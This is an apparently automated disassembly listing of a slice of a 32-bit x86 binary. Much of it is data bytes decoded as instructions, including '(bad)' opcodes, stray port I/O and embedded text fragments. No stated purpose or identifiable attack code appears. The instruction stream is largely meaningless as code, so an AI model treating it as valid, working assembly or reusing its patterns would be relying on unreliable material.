  427e93:	push   ebx
  427e94:	dec    ebp
  427e95:	xchg   esi,eax
  427e96:	call   FWORD PTR [eax+edx*2-0x687f7569]
  427e9d:	and    DWORD PTR [eax-0x69],edx
  427ea0:	and    DWORD PTR [ebp-0x29],ecx
  427ea3:	and    DWORD PTR [ecx],eax
  427ea5:	ja     0x427e31
  427ea7:	dec    ebp
  427ea8:	xlat   BYTE PTR ds:[ebx]
  427ea9:	out    dx,eax
  427eaa:	mov    dl,0x2
  427eac:	sub    DWORD PTR [edx],ecx
  427eae:	dec    ebp
  427eaf:	xlat   BYTE PTR ds:[ebx]
  427eb0:	and    DWORD PTR [ebp-0x29],ecx
  427eb3:	xchg   DWORD PTR [ebp-0x29],ecx
  427eb6:	xchg   BYTE PTR [ebp-0x29],cl
  427eb9:	enter  0xd74d,0x32
  427ebd:	xchg   bh,ah
  427ebf:	mov    cl,BYTE PTR [ebp+0x4d]
  427ec2:	stos   DWORD PTR es:[edi],eax
  427ec3:	push   eax
  427ec4:	ja     0x427e50
  427ec6:	xor    BYTE PTR [edi-0x76],0xa9
  427eca:	jo     0x427ec7
  427ecc:	out    dx,eax
  427ecd:	lea    edx,[edi-0x6127880]
  427ed3:	mov    ebp,ebp
  427ed5:	xchg   DWORD PTR [ebp-0x67],eax
  427ed8:	jl     0x427f4f
  427eda:	xor    eax,0x8d8d8d35
  427edf:	lea    edi,[ebp+esi*2+0x35]
  427ee3:	inc    ebp
  427ee4:	lea    ecx,[ebp+0x75018d8d]
  427eea:	xor    eax,0xd74d0a71
  427eef:	xor    eax,0x4d2dd74d
  427ef4:	xlat   BYTE PTR ds:[ebx]
  427ef5:	and    eax,0x4d1dd74d
  427efa:	xlat   BYTE PTR ds:[ebx]
  427efb:	adc    eax,0x4d71d74d
  427f00:	xlat   BYTE PTR ds:[ebx]
  427f01:	and    DWORD PTR [ebp-0x29],ecx
  427f04:	out    dx,eax
  427f05:	xchg   cl,bl
  427f07:	mov    eax,0x77804d4d
  427f0c:	out    dx,eax
  427f0d:	push   eax
  427f0e:	jne    0x427f45
  427f10:	out    dx,al
  427f11:	xor    BYTE PTR [ebp+0x35],0x35
  427f15:	dec    edi
  427f16:	push   0x9
  427f18:	prefetcht0 BYTE PTR [ebp+0x75808d8d]
  427f1f:	xor    eax,0x96a4f45
  427f24:	(bad)  
  427f26:	lea    ecx,[ebp+0x35d54d8d]
  427f2c:	and    eax,0x2535d54d
  427f31:	dec    ebp
  427f32:	aad    0x35
  427f34:	and    eax,0x81357580
  427f39:	dec    ebp
  427f3a:	test   DWORD PTR [eax-0x7f11ca8b],0x80ee3575
  427f44:	jne    0x427f7b
  427f46:	out    dx,al
  427f47:	add    DWORD PTR [edi-0x12],esi
  427f4a:	push   eax
  427f4b:	jne    0x427f82
  427f4d:	out    dx,eax
  427f4e:	xor    BYTE PTR [ebp+0x35],0x3d
  427f52:	in     al,dx
  427f53:	jne    0x427f8a
  427f55:	out    dx,al
  427f56:	push   eax
  427f57:	jne    0x427f8e
  427f59:	out    dx,al
  427f5a:	xor    BYTE PTR [ebp+0x35],0xee
  427f5e:	xor    BYTE PTR [ebp+0x35],0xee
  427f62:	xor    BYTE PTR [ecx],0x35
  427f65:	out    dx,al
  427f66:	adc    BYTE PTR [eax+0x26],0x3a
  427f6a:	lea    ecx,[ebp-0x2a7ff180]
  427f70:	xor    eax,0x2ecd80ef
  427f75:	cmp    cl,BYTE PTR [ebp+0x9195f8d]
  427f7b:	jmp    0x7180:0x8d8d3a16
  427f82:	add    BYTE PTR [ecx+0x165aa80],0x95
  427f89:	sbb    DWORD PTR [edx],ecx
  427f8b:	sub    BYTE PTR [esi-0x80],0x90
  427f8f:	in     al,dx
  427f90:	jle    0x427f12
  427f92:	aad    0x35
  427f94:	out    dx,eax
  427f95:	pop    edi
  427f96:	sbb    DWORD PTR [ecx],ecx
  427f98:	in     eax,dx
  427f99:	fstp   TBYTE PTR [edx]
  427f9b:	lea    ecx,[ebp-0x10ca6a80]
  427fa1:	sub    BYTE PTR [esi-0x80],0xa6
  427fa5:	or     BYTE PTR [ebp-0x4d13aebd],0x50
  427fac:	or     al,0xbe
  427fae:	sar    BYTE PTR [edx],1
  427fb0:	lea    ecx,[ebp+0x45357580]
  427fb6:	dec    edi
  427fb7:	push   0x9
  427fb9:	dec    edi
  427fba:	cdq    
  427fbb:	cmp    cl,BYTE PTR [ebp+0x3575808d]
  427fc1:	out    dx,al
  427fc2:	or     ch,0x2e
  427fc5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fcb:	jne    0x428002
  427fcd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fd3:	int    0x26
  427fd5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fdb:	jne    0x428012
  427fdd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fe3:	int    0x10
  427fe5:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427feb:	lea    edx,[eax+0x75]
  427fee:	xor    eax,0x35758021
  427ff3:	out    dx,al
  427ff4:	or     ch,0x41
  427ff7:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427ffd:	lea    edx,[eax+0x75]
  428000:	xor    eax,0x35758021
  428005:	out    dx,al
  428006:	xor    BYTE PTR [ecx],0x35
  428009:	out    dx,al
  42800a:	or     ch,0x82
  42800d:	cmp    cl,BYTE PTR [ebp-0x7daf7f73]
  428013:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  428019:	xor    dl,bh
  42801b:	and    ah,BYTE PTR [edi+ebp*2]
  42801e:	cmp    BYTE PTR [ebx-0x4],dl
  428021:	in     eax,dx
  428022:	add    eax,0xc86b20d
  428027:	mov    dl,0xba
  428029:	sub    edi,edi
  42802b:	std    
  42802c:	push   eax
  42802d:	xor    DWORD PTR ds:0x35757c21,esi
  428033:	out    dx,eax
  428034:	lea    ecx,[ebp+0x75808d8d]
  42803a:	xor    eax,0xd56a4f35
  42803f:	ret    
  428040:	xor    BYTE PTR [ebp+0x35],0x71
  428044:	in     eax,dx
  428045:	xchg   BYTE PTR [ebp-0x2a82272b],cl
  42804b:	push   ebx
  42804c:	jge    0x4280cb
  42804e:	aad    0x23
  428050:	jge    0x428029
  428052:	fmul   DWORD PTR [ebp-0x2b]
  428055:	xor    eax,0x35d54d2d
  42805a:	sub    eax,0x2d35d54d
  42805f:	dec    ebp
  428060:	aad    0x35
  428062:	sub    eax,0x55357580
  428067:	dec    ebp
  428068:	test   esp,0x35d54d39
  42806e:	and    eax,0x2535d54d
  428073:	dec    ebp
  428074:	aad    0x35
  428076:	and    eax,0x81357580
  42807b:	dec    ebp
  42807c:	test   esp,0x35d54d90
  428082:	adc    eax,0x3d357580
  428087:	dec    ebp
  428088:	test   esp,0x3575806f
  42808e:	xor    eax,0x7550f74d
  428093:	xor    eax,0x357580ef
  428098:	and    DWORD PTR [edi+0x6a],ecx
  42809b:	aad    0xa1
  42809d:	xor    BYTE PTR [ebp+0x35],0xee
  4280a1:	jl     0x428070
  4280a3:	test   BYTE PTR [edx],bh
  4280a5:	lea    ecx,[ebp+0x386f24f5]
  4280ab:	xor    BYTE PTR [ebp+0x35],0xef
  4280af:	xor    BYTE PTR [ecx],0x35
  4280b2:	out    dx,al
  4280b3:	adc    BYTE PTR [eax-0x7d],0x3a
  4280b7:	lea    ecx,[ebp+0x757c3a50]
  4280bd:	xor    eax,0x6f24f6ef
  4280c2:	cmp    BYTE PTR [eax-0x7f10ca8b],al
  4280c8:	xor    DWORD PTR ds:0xedfc53ef,esi
  4280ce:	add    eax,0x29bab20d
  4280d3:	mov    dl,0x86
  4280d5:	or     al,0xff
  4280d7:	mov    dl,0x80
  4280d9:	xor    DWORD PTR ds:0xd7b26321,esi
  4280df:	and    eax,DWORD PTR [eax-0x7f11ca8b]
  4280e5:	xor    DWORD PTR ds:0x835080ee,esi
  4280eb:	cmp    cl,BYTE PTR [ebp-0x7f91b273]
  4280f1:	int    0x32
  4280f3:	cmp    cl,BYTE PTR [ebp+0x3d0a4d8d]
  4280f9:	les    ebx,FWORD PTR [edi]
  4280fb:	add    DWORD PTR [edi-0x12],esi
  4280fe:	push   eax
  4280ff:	jne    0x428136
  428101:	and    DWORD PTR [eax-0x7fdeca8b],eax
  428107:	xor    DWORD PTR ds:0xe55080ee,esi
  42810d:	cmp    cl,BYTE PTR [ebp+0x3a30808d]
  428113:	out    dx,eax
  428114:	xor    BYTE PTR [ebp+0x35],0xee
  428118:	or     ch,0x87
  42811b:	cmp    cl,BYTE PTR [ebp-0x7f10b273]
  428121:	xor    DWORD PTR ds:0x865080ee,esi
  428127:	cmp    cl,BYTE PTR [ebp+0x18d808d]
  42812d:	out    dx,al
  42812e:	mov    ds:0xee353180,al
  428133:	adc    BYTE PTR [eax-0x1b],0x3a
  428137:	lea    ecx,[ebp+0x30808d80]
  42813d:	cmp    ch,bh
  42813f:	test   eax,0xfba7b880
  428144:	sub    eax,0x614c748d
  428149:	imul   edi,DWORD PTR [ecx+0x62],0x69
  42814d:	popa   
  42814e:	push   0x6c656548
  428153:	ins    BYTE PTR es:[edi],dx
  428154:	outs   dx,DWORD PTR ds:[esi]
  428155:	ja     0x428157
  428157:	popa   
  428158:	ins    DWORD PTR es:[edi],dx
  428159:	imul   edi,DWORD PTR [edx+0x65],0x676f6e70
  428160:	push   ebp
  428161:	outs   dx,BYTE PTR ds:[esi]
  428162:	bound  esp,QWORD PTR [ebp+0x0]
  428165:	push   0x6572576d
  42816a:	outs   dx,BYTE PTR ds:[esi]
  42816b:	jne    0x4281d1
  42816d:	outs   dx,DWORD PTR ds:[esi]
  42816e:	popa   
  42816f:	push   0x6b637573
  428174:	add    BYTE PTR [ebp+0x6f],cl
  428177:	ins    DWORD PTR es:[edi],dx
  428178:	imul   ecx,DWORD PTR [ebp+0x75],0x6c617367
  42817f:	jo     0x4281e6
  428181:	je     0x428183
  428183:	dec    edx
  428184:	gs jae 0x4281fa
  428187:	ins    BYTE PTR es:[edi],dx
  428188:	outs   dx,DWORD PTR ds:[esi]
  428189:	dec    edi
  42818a:	js     0x4281f1
  42818c:	outs   dx,BYTE PTR ds:[esi]
  42818d:	outs   dx,DWORD PTR ds:[esi]
  42818e:	jb     0x4281f1
  428190:	add    BYTE PTR [edi+0x6f],al
  428193:	ja     0x4281f9
  428195:	dec    ebp
  428196:	imul   esi,DWORD PTR [ebx+0x6f],0x706179
  42819d:	imul   esi,DWORD PTR fs:[eax+0x6f],0x6d6f6d72
  4281a5:	imul   esp,DWORD PTR [ebx+0x6b],0x6c6c4900
  4281ac:	jae    0x42821b
  4281ae:	popa   
  4281af:	fs jns 0x428221
  4281b2:	imul   ebp,DWORD PTR [ecx+0x0],0x6b
  4281b6:	imul   esi,DWORD PTR [edx+0x7a],0x64756261
  4281bd:	bound  esi,QWORD PTR [ebp+0x6d]
  4281c0:	add    BYTE PTR [ebp+0x72],al
  4281c3:	outs   dx,DWORD PTR ds:[si]
  4281c5:	jo     0x428228
  4281c7:	jns    0x42822f
  4281c9:	imul   edi,DWORD PTR [eax+0x0],0x6d736e6f
  4281d0:	jne    0x42823f
  4281d2:	popa   
  4281d3:	gs fs jo 0x42823c
  4281d7:	imul   esi,DWORD PTR [esi+0x79],0x67756800
  4281de:	dec    esp
  4281df:	outs   dx,DWORD PTR ds:[esi]
  4281e0:	jne    0x428246
  4281e2:	push   0x6d6d7069
  4281e7:	add    BYTE PTR [edi+0x6c],al
  4281ea:	outs   dx,DWORD PTR ds:[esi]
  4281eb:	jo     0x428240
  4281ed:	ja     0x42825e
  4281ef:	bound  eax,QWORD PTR [eax]
  4281f1:	jns    0x428262
  4281f3:	pop    ecx
  4281f4:	gs ins BYTE PTR es:[edi],dx
  4281f6:	jo     0x428251
  4281f8:	jne    0x428266
  4281fa:	gs gs jae 0x42825f
  4281fe:	popa   
  4281ff:	add    BYTE PTR [ecx+0x77],ah
  428202:	popa   
  428203:	inc    esi
  428204:	imul   ebp,DWORD PTR [esi+0x65],0x4f706173
  42820b:	outs   dx,BYTE PTR ds:[esi]
  42820c:	je     0x42827d
  42820e:	add    BYTE PTR [ebp+0x73],ah
  428211:	dec    esp
  428212:	imul   ebp,DWORD PTR [esi+0x67],0x68737574
  428219:	ins    BYTE PTR es:[edi],dx
  42821a:	outs   dx,DWORD PTR ds:[esi]
  42821b:	bound  esp,QWORD PTR [ebp+0x0]
  42821e:	push   0x617a6761
  428223:	bound  ebp,QWORD PTR [edi+0x75]
  428226:	jo     0x428228
  428228:	inc    edx
  428229:	outs   dx,DWORD PTR ds:[esi]
  42822a:	jb     0x4282a0
  42822c:	popa   
  42822d:	js     0x42829e
  42822f:	data16 jo 0x428297
  428232:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x776f0077
  42823a:	fs gs popa 
  42823d:	outs   dx,DWORD PTR fs:[esi]
  42823f:	jae    0x4282b9
  428241:	jne    0x428243
  428243:	inc    edi
  428244:	add    BYTE PTR [edi+0x0],ch
  428247:	add    BYTE PTR gs:[ebx+0x0],dh
  42824b:	dec    edx
  42824c:	add    BYTE PTR [ecx+0x0],ah
  42824f:	jbe    0x428251
  428251:	popa   
  428252:	add    BYTE PTR [eax],al
  428254:	add    BYTE PTR [edx+0x0],al
  428257:	popa   
  428258:	add    BYTE PTR [edx+0x0],ah
  42825b:	jne    0x42825d
  42825d:	outs   dx,DWORD PTR ds:[esi]
  42825e:	add    BYTE PTR [ebp+0x0],ch
  428261:	push   0x6d00
  428266:	add    BYTE PTR [edx+0x0],dh
  428269:	popa   
  42826a:	add    BYTE PTR [eax+eax*1+0x74],dh
  42826e:	add    BYTE PTR [ecx+0x0],ah
  428271:	ins    DWORD PTR es:[edi],dx
  428272:	add    BYTE PTR [edi+0x0],ah
  428275:	popa   
  428276:	add    BYTE PTR [ecx+0x0],bh
  428279:	js     0x42827b
  42827b:	imul   eax,DWORD PTR [eax],0x610000
  428281:	ins    DWORD PTR es:[edi],dx
  428282:	add    BYTE PTR [ecx+0x0],ah
  428285:	ins    BYTE PTR es:[edi],dx
  428286:	add    BYTE PTR [edx+0x0],ah
  428289:	outs   dx,DWORD PTR ds:[esi]
  42828a:	add    BYTE PTR [edi+0x0],ch
  42828d:	popa   
  42828e:	add    BYTE PTR [eax+0x0],dh
  428291:	jo     0x428293
  428293:	add    BYTE PTR [eax],al
  428295:	popa   
  428296:	add    BYTE PTR [esi+0x0],dh
  428299:	popa   
  42829a:	add    BYTE PTR [edi+0x0],ah
  42829d:	outs   dx,DWORD PTR ds:[esi]
  42829e:	add    BYTE PTR [ebx+0x0],dh
  4282a1:	push   0x77006f00
  4282a6:	add    BYTE PTR [eax+eax*1+0x65],ch
  4282aa:	add    BYTE PTR [ebp+0x0],dh
  4282ad:	add    BYTE PTR fs:[ebp+0x0],ah
  4282b1:	add    BYTE PTR fs:[eax],al
  4282b4:	add    BYTE PTR [eax+0x0],cl
  4282b7:	popa   
  4282b8:	add    BYTE PTR [edx+0x0],dh
  4282bb:	add    BYTE PTR gs:[edx+0x0],al
  4282bf:	imul   eax,DWORD PTR [eax],0x6b0072
  4282c5:	arpl   WORD PTR [eax],ax
  4282c7:	popa   
  4282c8:	add    BYTE PTR [ebp+0x0],ch
  4282cb:	add    BYTE PTR [eax],al
  4282cd:	imul   eax,DWORD PTR [eax],0x61
  4282d0:	add    BYTE PTR [edi+0x0],dh
  4282d3:	popa   
  4282d4:	add    BYTE PTR [eax+0x0],bh
  4282d7:	outs   dx,DWORD PTR ds:[esi]
  4282d8:	add    BYTE PTR [edi+0x0],ch
  4282db:	je     0x4282dd
  4282dd:	add    BYTE PTR [eax],al
  4282df:	jb     0x4282e1
  4282e1:	jne    0x4282e3
  4282e3:	add    BYTE PTR gs:[ecx+0x0],ah
  4282e7:	ins    BYTE PTR es:[edi],dx
  4282e8:	add    BYTE PTR [eax+eax*1+0x68],ch
  4282ec:	add    BYTE PTR [ebp+0x0],ch
  4282ef:	ins    DWORD PTR es:[edi],dx
  4282f0:	add    BYTE PTR [eax],al
  4282f2:	add    BYTE PTR [edi+0x0],ch
  4282f5:	add    BYTE PTR gs:[eax+0x0],bh
  4282f9:	imul   eax,DWORD PTR [eax],0x650072
  4282ff:	ja     0x428301
  428301:	outs   dx,DWORD PTR ds:[esi]
  428302:	add    BYTE PTR [ebp+0x0],ah
  428305:	popa   
  428306:	add    BYTE PTR [edx+0x0],ah
  428309:	ins    BYTE PTR es:[edi],dx
  42830a:	add    BYTE PTR [ecx+0x0],ch
  42830d:	add    BYTE PTR [eax],al
  42830f:	jne    0x428311
  428311:	ins    DWORD PTR es:[edi],dx
  428312:	add    BYTE PTR [esi+0x0],ch
  428315:	outs   dx,DWORD PTR ds:[esi]
  428316:	add    BYTE PTR [edi+0x0],ah
  428319:	bound  eax,QWORD PTR [eax]
  42831b:	popa   
  42831c:	add    BYTE PTR [esi+0x0],dh
  42831f:	outs   dx,DWORD PTR ds:[esi]
  428320:	add    BYTE PTR [edi+0x0],dh
  428323:	bound  eax,QWORD PTR [eax]
  428325:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  42832a:	add    BYTE PTR [eax],al
  42832c:	add    bh,dh
  42832e:	sub    al,0x10
  428330:	add    BYTE PTR [esi],bl
  428332:	aaa    
  428333:	adc    BYTE PTR [eax],al
  428335:	and    al,0x42
  428337:	adc    BYTE PTR [eax],al
  428339:	rol    BYTE PTR [eax+edx*1],cl
  42833c:	add    ch,dh
  42833e:	xor    BYTE PTR [eax],dl
  428340:	add    BYTE PTR [esi-0x1affefcf],dh
  428346:	cmp    dl,BYTE PTR [eax]
  428348:	add    BYTE PTR [ebx],dh
  42834a:	ins    BYTE PTR es:[edi],dx
  42834b:	adc    BYTE PTR [eax],al
  42834d:	sub    DWORD PTR [eax+edx*1+0x0],esp
  428351:	push   ecx
  428352:	inc    ecx
  428353:	adc    BYTE PTR [eax],al
  428355:	mov    cl,0x60
  428357:	adc    BYTE PTR [eax],al
  428359:	aas    
  42835a:	or     al,0x10
  42835c:	add    al,bh
  42835e:	and    DWORD PTR [eax],edx
  428360:	add    BYTE PTR [edx+0x37],dl
  428363:	adc    BYTE PTR [eax],al
  428365:	test   eax,0xa3001054
  42836a:	add    DWORD PTR [eax],edx
  42836c:	add    BYTE PTR [edi],ah
  42836e:	push   esp
  42836f:	adc    BYTE PTR [eax],al
  428371:	cmc    
  428372:	push   esi
  428373:	adc    BYTE PTR [eax],al
  428375:	imul   ecx,DWORD PTR [ebx],0x10
  428378:	add    BYTE PTR ds:0x31004283,ch
  42837e:	add    DWORD PTR [edx+0x0],0x35
  428382:	add    DWORD PTR [edx+0x0],0x39
  428386:	add    DWORD PTR [edx+0x0],0x3d
  42838a:	add    DWORD PTR [edx+0x0],0x41
  42838e:	add    DWORD PTR [edx+0x0],0x45
  428392:	add    DWORD PTR [edx+0x0],0x49
  428396:	add    DWORD PTR [edx+0x0],0x4d
  42839a:	add    DWORD PTR [edx+0x0],0x51
  42839e:	add    DWORD PTR [edx+0x0],0x55
  4283a2:	add    DWORD PTR [edx+0x0],0x59
  4283a6:	add    DWORD PTR [edx+0x0],0x5d
  4283aa:	add    DWORD PTR [edx+0x0],0x61
  4283ae:	add    DWORD PTR [edx+0x0],0x65
  4283b2:	add    DWORD PTR [edx+0x0],0x69
  4283b6:	add    DWORD PTR [edx+0x0],0x6d
  4283ba:	add    DWORD PTR [edx+0x0],0x71
  4283be:	add    DWORD PTR [edx+0x0],0x75
  4283c2:	add    DWORD PTR [edx+0x0],0x5
  4283c6:	test   BYTE PTR [edx+0x0],al
  4283c9:	or     DWORD PTR [edx+eax*2+0x42840d00],eax
  4283d0:	add    BYTE PTR [ecx],dl
  4283d2:	test   BYTE PTR [edx+0x0],al
  4283d5:	adc    eax,0x19004284
  4283da:	test   BYTE PTR [edx+0x0],al
  4283dd:	sbb    eax,0x21004284
  4283e2:	test   BYTE PTR [edx+0x0],al
  4283e5:	and    eax,0x29004284
  4283ea:	test   BYTE PTR [edx+0x0],al
  4283ed:	sub    eax,0x31004284
  4283f2:	test   BYTE PTR [edx+0x0],al
  4283f5:	xor    eax,0x39004284
  4283fa:	test   BYTE PTR [edx+0x0],al
  4283fd:	cmp    eax,0x41004284
  428402:	test   BYTE PTR [edx+0x0],al
  428405:	arpl   WORD PTR [eax],si
  428407:	adc    BYTE PTR [eax],al
  428409:	push   ecx
  42840a:	xor    DWORD PTR [eax],edx
  42840c:	add    BYTE PTR [edi+ebx*2+0x10],ch
  428410:	add    BYTE PTR [ebx-0x5ffefc3],bl
  428416:	aaa    
  428417:	adc    BYTE PTR [eax],al
  428419:	(bad)  
  42841a:	pop    esi
  42841b:	adc    BYTE PTR [eax],al
  42841d:	call   0x1040:0xa400106a
  428424:	add    BYTE PTR [esi+0x23],ah
  428427:	adc    BYTE PTR [eax],al
  428429:	xor    DWORD PTR [eax],ebx
  42842b:	adc    BYTE PTR [eax],al
  42842d:	mov    edi,DWORD PTR [edi]
  42842f:	adc    BYTE PTR [eax],al
  428431:	and    BYTE PTR [ecx+0x10],0x0
  428435:	clc    
  428436:	ja     0x428448
  428438:	add    BYTE PTR [eax],dh
  42843a:	xor    dl,BYTE PTR [eax]
  42843c:	add    BYTE PTR [edx+esi*2+0x6bfb0010],ch
  428443:	adc    BYTE PTR [eax],al
  428445:	mov    fs,WORD PTR [ebx+0x10]
  428448:	add    BYTE PTR [ecx+0x6200107e],bl
  42844e:	daa    
  42844f:	adc    BYTE PTR [eax],al
  428451:	mov    edi,0x2e001069
  428456:	sub    eax,0x413c0010
  42845b:	adc    BYTE PTR [eax],al
  42845d:	xor    BYTE PTR [eax],dh
  42845f:	adc    BYTE PTR [eax],al
  428461:	outs   dx,BYTE PTR ds:[esi]
  428462:	dec    edi
  428463:	adc    BYTE PTR [eax],al
  428465:	adc    eax,0xeb001025
  42846a:	bound  edx,QWORD PTR [eax]
  42846c:	add    BYTE PTR [edi],dh
  42846e:	and    dl,BYTE PTR [eax]
  428470:	add    BYTE PTR [ebx+0x1a],bl
  428473:	adc    BYTE PTR [eax],al
  428475:	mov    BYTE PTR [esi+0x10],ch
  428478:	add    BYTE PTR [esi],ah
  42847a:	pusha  
  42847b:	adc    BYTE PTR [eax],al
  42847d:	pop    es
  42847e:	adc    eax,0x1ca50010
  428483:	adc    BYTE PTR [eax],al
  428485:	inc    ebp
  428486:	test   BYTE PTR [edx+0x0],al
  428489:	dec    ecx
  42848a:	test   BYTE PTR [edx+0x0],al
  42848d:	dec    ebp
  42848e:	test   BYTE PTR [edx+0x0],al
  428491:	push   ecx
  428492:	test   BYTE PTR [edx+0x0],al
  428495:	push   ebp
  428496:	test   BYTE PTR [edx+0x0],al
  428499:	pop    ecx
  42849a:	test   BYTE PTR [edx+0x0],al
  42849d:	pop    ebp
  42849e:	test   BYTE PTR [edx+0x0],al
  4284a1:	popa   
  4284a2:	test   BYTE PTR [edx+0x0],al
  4284a5:	test   BYTE PTR gs:[edx+0x0],al
  4284a9:	imul   eax,DWORD PTR [edx+eax*2+0x42846d00],0x42847100
  4284b4:	add    BYTE PTR [ebp-0x7c],dh
  4284b7:	inc    edx
  4284b8:	add    BYTE PTR [ecx-0x7c],bh
  4284bb:	inc    edx
  4284bc:	add    BYTE PTR [ebp-0x7c],bh
  4284bf:	inc    edx
  4284c0:	add    BYTE PTR [ecx-0x5affbd7c],al
  4284c6:	das    
  4284c7:	adc    BYTE PTR [eax],al
  4284c9:	add    bh,BYTE PTR [esi+0x10]
  4284cc:	add    BYTE PTR [ebx],ch
  4284ce:	adc    al,0x10
  4284d0:	add    BYTE PTR ds:0x4b001060,ah
  4284d6:	pop    edx
  4284d7:	adc    BYTE PTR [eax],al
  4284d9:	dec    ecx
  4284da:	jne    0x4284ec
  4284dc:	add    dh,ch
  4284de:	pop    esp
  4284df:	adc    BYTE PTR [eax],al
  4284e1:	push   edx
  4284e2:	cmp    eax,0x529b0010
  4284e7:	adc    BYTE PTR [eax],al
  4284e9:	pop    ss
  4284ea:	cmp    dl,BYTE PTR [eax]
  4284ec:	add    BYTE PTR [ebp-0x64ffef93],cl
  4284f2:	xor    eax,0x158d0010
  4284f7:	adc    BYTE PTR [eax],al
  4284f9:	adc    DWORD PTR [edi+0x10],ebp
  4284fc:	add    BYTE PTR [ecx+0x51],ch
  4284ff:	adc    BYTE PTR [eax],al
  428501:	jmp    0x42850f
  428503:	adc    BYTE PTR [eax],al
  428505:	lds    eax,FWORD PTR [edx+eax*2+0x4284c900]
  42850c:	add    ch,cl
  42850e:	test   BYTE PTR [edx+0x0],al
  428511:	rol    DWORD PTR [edx+eax*2+0x4284d500],1
  428518:	add    cl,bl
  42851a:	test   BYTE PTR [edx+0x0],al
  42851d:	fld    QWORD PTR [edx+eax*2+0x4284e100]
  428524:	add    ch,ah
  428526:	test   BYTE PTR [edx+0x0],al
  428529:	jmp    0xed42c7b2
  42852e:	test   BYTE PTR [edx+0x0],al
  428531:	icebp  
  428532:	test   BYTE PTR [edx+0x0],al
  428535:	cmc    
  428536:	test   BYTE PTR [edx+0x0],al
  428539:	stc    
  42853a:	test   BYTE PTR [edx+0x0],al
  42853d:	std    
  42853e:	test   BYTE PTR [edx+0x0],al
  428541:	add    DWORD PTR [ebp+0x45d70042],eax
  428547:	adc    BYTE PTR [eax],al
  428549:	xlat   BYTE PTR ds:[ebx]
  42854a:	pusha  
  42854b:	adc    BYTE PTR [eax],al
  42854d:	lea    ebp,[eax+edx*1+0x0]
  428551:	hlt    
  428552:	add    BYTE PTR [eax],dl
  428554:	add    BYTE PTR [esp+esi*2],dl
  428557:	adc    BYTE PTR [eax],al
  428559:	out    0x44,al
  42855b:	adc    BYTE PTR [eax],al
  42855d:	dec    esi
  42855e:	bound  edx,QWORD PTR [eax]
  428560:	add    BYTE PTR [edi+ebp*2],ch
  428563:	adc    BYTE PTR [eax],al
  428565:	cmp    ebx,DWORD PTR [ebx]
  428567:	adc    BYTE PTR [eax],al
  428569:	inc    ebp
  42856a:	pop    ecx
  42856b:	adc    BYTE PTR [eax],al
  42856d:	imul   BYTE PTR [ecx+0x10]
  428570:	add    BYTE PTR [esi],ah
  428572:	arpl   WORD PTR [eax],dx
  428574:	add    BYTE PTR [ebp-0x4fffefee],bh
  42857a:	sbb    edx,DWORD PTR [eax]
  42857c:	add    BYTE PTR [ebx],ah
  42857e:	adc    BYTE PTR ds:[eax],al
  428581:	xchg   ebx,eax
  428582:	push   ecx
  428583:	adc    BYTE PTR [eax],al
  428585:	inc    ebp
  428586:	test   DWORD PTR [edx+0x0],eax
  428589:	dec    ecx
  42858a:	test   DWORD PTR [edx+0x0],eax
  42858d:	dec    ebp
  42858e:	test   DWORD PTR [edx+0x0],eax
  428591:	push   ecx
  428592:	test   DWORD PTR [edx+0x0],eax
  428595:	push   ebp
  428596:	test   DWORD PTR [edx+0x0],eax
  428599:	pop    ecx
  42859a:	test   DWORD PTR [edx+0x0],eax
  42859d:	pop    ebp
  42859e:	test   DWORD PTR [edx+0x0],eax
  4285a1:	popa   
  4285a2:	test   DWORD PTR [edx+0x0],eax
  4285a5:	test   DWORD PTR gs:[edx+0x0],eax
  4285a9:	imul   eax,DWORD PTR [ebp-0x7a92ffbe],0x85710042
  4285b3:	inc    edx
  4285b4:	add    BYTE PTR [ebp-0x7b],dh
  4285b7:	inc    edx
  4285b8:	add    BYTE PTR [ecx-0x7b],bh
  4285bb:	inc    edx
  4285bc:	add    BYTE PTR [ebp-0x7b],bh
  4285bf:	inc    edx
  4285c0:	add    BYTE PTR [ecx+0x4285],al
	...
  4285d2:	add    BYTE PTR [eax],al
  4285d4:	sub    ch,dl
  4285d6:	mov    dh,0x4f
  4285d8:	add    BYTE PTR [eax],al
  4285da:	add    BYTE PTR [eax],al
  4285dc:	inc    eax
  4285dd:	xchg   esi,eax
  4285de:	add    al,BYTE PTR [eax]
  4285e0:	add    DWORD PTR [eax],eax
  4285e2:	add    BYTE PTR [eax],al
  4285e4:	add    DWORD PTR [eax],eax
  4285e6:	add    BYTE PTR [eax],al
  4285e8:	add    DWORD PTR [eax],eax
  4285ea:	add    BYTE PTR [eax],al
  4285ec:	adc    BYTE PTR [esi-0x69cffffe],dl
  4285f2:	add    al,BYTE PTR [eax]
  4285f4:	and    BYTE PTR [esi+0x2],dl
  4285fa:	add    BYTE PTR [eax],al
  4285fc:	add    BYTE PTR [eax],al
  4285fe:	add    BYTE PTR [eax],al
  428600:	adc    BYTE PTR [ecx+0x2],cl
  428606:	add    BYTE PTR [eax],al
  428608:	mov    DWORD PTR cs:[edx],eax
  42860b:	add    BYTE PTR [edx-0x77],al
  42860e:	add    al,BYTE PTR [eax]
  428610:	pop    eax
  428611:	mov    DWORD PTR [edx],eax
  428613:	add    BYTE PTR [eax-0x77],ch
  428616:	add    al,BYTE PTR [eax]
  428618:	jbe    0x4285a3
  42861a:	add    al,BYTE PTR [eax]
  42861c:	mov    cs,WORD PTR [ecx-0x7665fffe]
  428622:	add    al,BYTE PTR [eax]
  428624:	mov    al,0x89
  428626:	add    al,BYTE PTR [eax]
  428628:	mov    esp,0xce000289
  42862d:	mov    DWORD PTR [edx],eax
  42862f:	add    dl,bl
  428631:	mov    DWORD PTR [edx],eax
  428633:	add    dl,ch
  428635:	mov    DWORD PTR [edx],eax
  428637:	add    dl,bh
  428639:	mov    DWORD PTR [edx],eax
  42863b:	add    BYTE PTR [esi],al
  42863d:	mov    al,BYTE PTR [edx]
  42863f:	add    BYTE PTR [edx+ecx*4],dl
  428642:	add    al,BYTE PTR [eax]
  428644:	and    BYTE PTR [edx-0x75d3fffe],cl
  42864a:	add    al,BYTE PTR [eax]
  42864c:	mov    al,BYTE PTR ss:[edx]
  42864f:	add    BYTE PTR [edx-0x76],cl
